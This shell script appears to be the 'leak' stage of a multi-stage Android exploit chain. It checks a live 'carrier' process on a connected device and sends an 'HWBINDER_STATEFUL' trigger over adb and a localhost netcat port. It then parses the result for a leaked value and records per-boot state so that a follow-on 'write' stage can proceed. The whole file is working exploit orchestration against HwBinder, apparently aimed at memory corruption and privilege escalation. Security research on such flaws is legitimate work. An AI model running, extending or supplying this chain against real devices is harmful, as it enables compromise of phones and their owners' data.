#!/bin/sh
# Contract: input=valid live carrier; precondition=carrier stage/live identity;
# action=HWBINDER_STATEFUL only; output=current-boot success or spent evidence.
# Boot-scoped=yes. Fresh Binder state may be consumed=yes. Retry in same boot=
# no, except inspecting an already-recorded success. Never reboots or writes.
# Next: write after success; reboot after BINDER_BOOT_SPENT.
set -eu
SNUSNU_REPO_DIR="$(CDPATH= cd -- "$(dirname -- "$0")/../.." && pwd)"
STAGE_NAME=leak
. "$SNUSNU_REPO_DIR/scripts/lib/common.sh"
. "$SNUSNU_REPO_DIR/scripts/lib/state.sh"
. "$SNUSNU_REPO_DIR/scripts/lib/carrier.sh"

require_device
boot="$(current_boot_id)"
if [ "$(state_boot_relation leak "$boot")" = current ]; then
    prior="$(state_field leak status 2>/dev/null || true)"
    case "$prior" in
        success)
            carrier_validate_live || stage_fatal "$STAGE_NAME" CARRIER_FAILURE "$CARRIER_VALIDATION_ERROR" 22
            prior_detail="$(state_field leak detail 2>/dev/null || true)"
            prior_pid="${prior_detail#pid=}"; prior_pid="${prior_pid%%,*}"
            [ "$prior_pid" = "$CARRIER_PID" ] \
                || stage_fatal "$STAGE_NAME" PRECONDITION_FAILURE recorded_leak_carrier_pid_is_stale
            echo 'leak=success_already_recorded'
            echo "boot_id=$boot"
            stage_ok "$STAGE_NAME"
            exit 0
            ;;
        spent|attempting|unknown) stage_fatal "$STAGE_NAME" BINDER_BOOT_SPENT binder_state_already_spent_or_uncertain 30 ;;
    esac
fi
carrier_validate_live \
    || stage_fatal "$STAGE_NAME" CARRIER_FAILURE "$CARRIER_VALIDATION_ERROR" 22
state_record leak attempting "$boot" "pid=$CARRIER_PID"
result="$(printf 'HWBINDER_STATEFUL\n' | adb shell "toybox nc -w 6 127.0.0.1 $SNUSNU_PROBE_PORT" 2>&1 | tr -d '\r' || true)"
echo "hwbinder_leak_result=$result"
case "$result" in
    *result=0x5000000000000000*)
        state_record leak success "$boot" "pid=$CARRIER_PID"
        echo 'leak=success'
        echo 'binder_boot_state=leaked_ready_for_write'
        echo "boot_id=$boot"
        stage_ok "$STAGE_NAME"
        ;;
    *result=0x40*)
        state_record leak spent "$boot" "pid=$CARRIER_PID,result=$(stage_reason "$result")"
        echo 'binder_boot_state=spent' >&2
        stage_fatal "$STAGE_NAME" BINDER_BOOT_SPENT stateful_leak_failed 30
        ;;
    *)
        # The request was issued, but transport/native output does not prove
        # that the Binder primitive ran. Refuse progression without falsely
        # declaring the boot spent; a researcher can inspect before rebooting.
        state_record leak unknown "$boot" "pid=$CARRIER_PID,result=$(stage_reason "$result")"
        echo 'binder_boot_state=unknown' >&2
        stage_fatal "$STAGE_NAME" BINDER_STATE_UNKNOWN leak_attempt_result_unknown 31
        ;;
esac
